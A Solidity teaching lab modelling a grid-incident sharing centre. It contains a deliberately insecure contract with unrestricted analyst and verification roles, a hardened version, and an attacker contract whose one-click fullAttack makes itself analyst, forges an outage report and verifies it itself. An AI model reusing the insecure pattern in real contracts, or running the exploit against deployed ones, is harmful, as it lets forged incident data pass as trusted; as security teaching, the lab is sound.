// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * SMART CONTRACT LAB:
 *  "Electricity Information Sharing and Analysis Center (E-ISAC)"
 *
 * We model:
 *  - Grid events submitted by utilities (power outages, cyber incidents)
 *  - Analysts verifying events
 *  - Severity scores
 *  - Region tags
 *
 * Insecure:
 *  - Anyone can verify anything
 *  - Anyone can modify events
 *  - Plaintext details stored
 *
 * Secure:
 *  - Only registered utilities may submit
 *  - Only approved analysts can verify
 *  - Hash-only records
 *  - Immutable event integrity
 */

/*//////////////////////////////////////////////////////////////
//                     INSECURE E-ISAC
//////////////////////////////////////////////////////////////*/

contract EISACInsecure {
    struct GridEvent {
        address reporter;
        string region;        // e.g., "APAC", "NA", "EU"
        string details;       // full plaintext event info
        uint256 severity;     // 1–10
        bool verified;
        address verifiedBy;
        bool exists;
    }

    mapping(uint256 => GridEvent) public events;
    mapping(address => bool) public isAnalyst;   // anyone can add themselves

    uint256 public nextId;

    event AnalystSet(address indexed who, bool status);
    event EventSubmitted(uint256 indexed id, address indexed reporter);
    event EventVerified(uint256 indexed id, address indexed analyst);

    /**
     * ⚠️ VULN #1: Anyone can become analyst.
     */
    function setAnalyst(address who, bool status) external {
        isAnalyst[who] = status;
        emit AnalystSet(who, status);
    }

    /**
     * ⚠️ VULN #2: Anyone can submit an event for any region.
     */
    function submitEvent(
        string calldata region,
        string calldata details,
        uint256 severity
    ) external returns (uint256) {
        uint256 id = nextId++;

        events[id] = GridEvent({
            reporter: msg.sender,
            region: region,
            details: details,
            severity: severity,
            verified: false,
            verifiedBy: address(0),
            exists: true
        });

        emit EventSubmitted(id, msg.sender);
        return id;
    }

    /**
     * ⚠️ VULN #3: Anyone can verify any event.
     */
    function verifyEvent(uint256 id) external {
        GridEvent storage e = events[id];
        require(e.exists, "NO_EVENT");

        e.verified = true;
        e.verifiedBy = msg.sender;

        emit EventVerified(id, msg.sender);
    }

    /**
     * Fake trust check.
     */
    function isTrusted(uint256 id) external view returns (bool) {
        GridEvent storage e = events[id];
        if (!e.exists) return false;
        if (!e.verified) return false;
        if (!isAnalyst[e.verifiedBy]) return false;
        return true;
    }
}

/*//////////////////////////////////////////////////////////////
//                            OWNABLE
//////////////////////////////////////////////////////////////*/

contract Ownable {
    address public owner;

    event OwnershipTransferred(address indexed oldOwner, address indexed newOwner);

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner, "NOT_OWNER");
        _;
    }

    function transferOwnership(address n) external onlyOwner {
        require(n != address(0), "ZERO");
        owner = n;
        emit OwnershipTransferred(msg.sender, n);
    }
}

/*//////////////////////////////////////////////////////////////
//                     SECURE E-ISAC (DEFENDED)
//////////////////////////////////////////////////////////////*/

contract EISACSecure is Ownable {
    struct GridEvent {
        uint256 id;
        address reporter;
        bytes32 regionId;        // hashed region
        bytes32 detailsHash;     // hashed event details
        uint256 severity;        // 1–10
        bool verified;
        address verifiedBy;
        bool exists;
    }

    mapping(uint256 => GridEvent) public events;
    mapping(address => bool) public isAnalyst;     // trusted analysts
    mapping(address => bool) public isUtility;     // trusted reporting utilities

    uint256 public nextId;

    event AnalystSet(address indexed who, bool allowed);
    event UtilitySet(address indexed who, bool allowed);
    event EventSubmitted(uint256 indexed id, address indexed reporter, bytes32 regionId);
    event EventVerified(uint256 indexed id, address indexed analyst);

    modifier onlyAnalyst {
        require(isAnalyst[msg.sender], "NOT_ANALYST");
        _;
    }

    modifier onlyUtility {
        require(isUtility[msg.sender], "NOT_UTILITY");
        _;
    }

    /**
     * Admin assigns trusted utilities.
     */
    function setUtility(address who, bool allowed) external onlyOwner {
        require(who != address(0), "ZERO");
        isUtility[who] = allowed;
        emit UtilitySet(who, allowed);
    }

    /**
     * Admin assigns trusted analysts.
     */
    function setAnalyst(address who, bool allowed) external onlyOwner {
        require(who != address(0), "ZERO");
        isAnalyst[who] = allowed;
        emit AnalystSet(who, allowed);
    }

    /**
     * Utilities submit hashed event data.
     */
    function submitEvent(
        bytes32 regionId,
        bytes32 detailsHash,
        uint256 severity
    ) external onlyUtility returns (uint256) {
        require(severity > 0 && severity <= 10, "BAD_SEVERITY");
        require(detailsHash != bytes32(0), "EMPTY");

        uint256 id = nextId++;

        events[id] = GridEvent({
            id: id,
            reporter: msg.sender,
            regionId: regionId,
            detailsHash: detailsHash,
            severity: severity,
            verified: false,
            verifiedBy: address(0),
            exists: true
        });

        emit EventSubmitted(id, msg.sender, regionId);
        return id;
    }

    /**
     * Analysts verify events.
     */
    function verifyEvent(uint256 id) external onlyAnalyst {
        GridEvent storage e = events[id];
        require(e.exists, "NO_EVENT");

        e.verified = true;
        e.verifiedBy = msg.sender;

        emit EventVerified(id, msg.sender);
    }

    /**
     * Strict trust check.
     */
    function isTrusted(uint256 id) external view returns (bool) {
        GridEvent storage e = events[id];
        if (!e.exists) return false;
        if (!e.verified) return false;
        if (!isAnalyst[e.verifiedBy]) return false;
        if (!isUtility[e.reporter]) return false;
        return true;
    }
}

/*//////////////////////////////////////////////////////////////
//                           ATTACKER
//////////////////////////////////////////////////////////////*/

contract EISACAttacker {
    EISACInsecure public target;

    constructor(address _target) {
        target = EISACInsecure(_target);
    }

    /**
     * Step 1 — become analyst
     */
    function becomeAnalyst() public {
        target.setAnalyst(address(this), true);
    }

    /**
     * Step 2 — submit fake outage/cyber-incident
     */
    function forgeEvent(string calldata region, string calldata details, uint256 severity)
        public
        returns (uint256)
    {
        return target.submitEvent(region, details, severity);
    }

    /**
     * Step 3 — verify your own fake event
     */
    function selfVerify(uint256 id) public {
        target.verifyEvent(id);
    }

    /**
     * One-click exploit
     */
    function fullAttack(string calldata region, string calldata details, uint256 severity)
        external
        returns (uint256)
    {
        becomeAnalyst();
        uint256 id = forgeEvent(region, details, severity);
        selfVerify(id);
        return id;
    }
}
